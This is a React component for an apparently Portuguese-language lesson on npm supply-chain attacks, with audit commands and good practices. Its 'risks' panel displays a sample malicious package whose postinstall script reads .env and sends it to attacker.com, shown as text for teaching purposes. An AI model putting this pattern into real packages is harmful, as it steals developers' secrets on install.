'use client'

import { useState } from 'react'

export function DependenciesDemo() {
  const [demo, setDemo] = useState<'initial' | 'risks' | 'audit'>('initial')

  return (
    <div className="my-8 space-y-4">
      <div className="rounded-2xl border border-slate-800 bg-slate-900/60 p-6">
        {demo === 'initial' && (
          <div className="space-y-4">
            <h3 className="text-lg font-semibold">Supply Chain Attacks</h3>
            <p className="text-sm text-slate-300">
              Quando você instala uma lib, você instala o código + os bugs + as intenções do autor.
            </p>
          </div>
        )}

        {demo === 'risks' && (
          <div className="space-y-4">
            <div className="rounded-lg bg-red-950/30 border border-red-900 p-4">
              <h4 className="font-semibold text-red-400 mb-3">Scripts Maliciosos no package.json</h4>
              <pre className="text-xs overflow-x-auto bg-black/50 p-3 rounded mb-3">
{`{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "node steal-secrets.js"
  }
}

// steal-secrets.js
const fs = require('fs')
const https = require('https')

// Rouba .env e envia para servidor do atacante
const secrets = fs.readFileSync('.env', 'utf8')
https.get(\`https://attacker.com?data=\${secrets}\`)

// Roda AUTOMATICAMENTE quando você faz npm install!`}</pre>
              <div className="bg-red-900/20 p-3 rounded space-y-3">
                <div>
                  <p className="text-sm font-semibold text-red-300 mb-2">Casos Reais:</p>
                  <ul className="text-xs text-slate-300 space-y-2 ml-4">
                    <li>
                      <strong className="text-red-400">event-stream (2018)</strong>
                      <br />
                      <span className="text-slate-400">2M+ downloads/semana. Injetaram código para roubar Bitcoin.</span>
                    </li>
                    <li>
                      <strong className="text-red-400">ua-parser-js (2021)</strong>
                      <br />
                      <span className="text-slate-400">8M+ downloads/semana. Instalava cryptominer e trojan.</span>
                    </li>
                    <li>
                      <strong className="text-red-400">node-ipc (2022)</strong>
                      <br />
                      <span className="text-slate-400">Autor sabotou propositalmente: deletava arquivos de usuários russos.</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        )}

        {demo === 'audit' && (
          <div className="space-y-4">
            <div className="rounded-lg bg-sky-950/30 border border-sky-900 p-4">
              <h4 className="font-semibold text-sky-400 mb-3">Comandos de Auditoria</h4>
              <div className="space-y-3">
                <div>
                  <p className="text-xs text-slate-400 mb-1">Verificar vulnerabilidades:</p>
                  <pre className="text-xs bg-black/50 p-2 rounded">npm audit</pre>
                </div>
                <div>
                  <p className="text-xs text-slate-400 mb-1">Corrigir automaticamente:</p>
                  <pre className="text-xs bg-black/50 p-2 rounded">npm audit fix</pre>
                </div>
                <div>
                  <p className="text-xs text-slate-400 mb-1">Ver detalhes em JSON:</p>
                  <pre className="text-xs bg-black/50 p-2 rounded">npm audit --json</pre>
                </div>
                <div>
                  <p className="text-xs text-slate-400 mb-1">Ignorar scripts durante install (mais seguro):</p>
                  <pre className="text-xs bg-black/50 p-2 rounded">npm install --ignore-scripts</pre>
                </div>
              </div>
            </div>
            <div className="rounded-lg bg-emerald-950/30 border border-emerald-900 p-4">
              <h4 className="font-semibold text-emerald-400 mb-3">Boas Práticas</h4>
              <ul className="text-xs text-slate-300 space-y-2 ml-4">
                <li>Execute <code className="bg-black/50 px-1 rounded">npm audit</code> regularmente</li>
                <li>Use Dependabot ou Renovate para atualizações automáticas</li>
                <li>Revise dependências antes de instalar (GitHub stars, última atualização, mantenedores)</li>
                <li>Use <code className="bg-black/50 px-1 rounded">package-lock.json</code> para lock de versões</li>
                <li>Configure CI/CD para falhar se houver vulnerabilidades críticas</li>
                <li>Considere <code className="bg-black/50 px-1 rounded">--ignore-scripts</code> em ambientes sensíveis</li>
              </ul>
            </div>
          </div>
        )}
      </div>

      <div className="flex flex-wrap gap-3">
        <button
          onClick={() => setDemo('risks')}
          className="inline-flex items-center gap-2 rounded-full bg-rose-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-rose-400 transition-colors"
        >
          Riscos e casos reais
        </button>
        <button
          onClick={() => setDemo('audit')}
          className="inline-flex items-center gap-2 rounded-full bg-sky-500 px-4 py-2 text-sm font-semibold text-slate-950 hover:bg-sky-400 transition-colors"
        >
          Comandos de auditoria
        </button>
        {demo !== 'initial' && (
          <button
            onClick={() => setDemo('initial')}
            className="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-sm font-semibold text-slate-100 hover:bg-slate-600 transition-colors"
          >
            Resetar
          </button>
        )}
      </div>
    </div>
  )
}
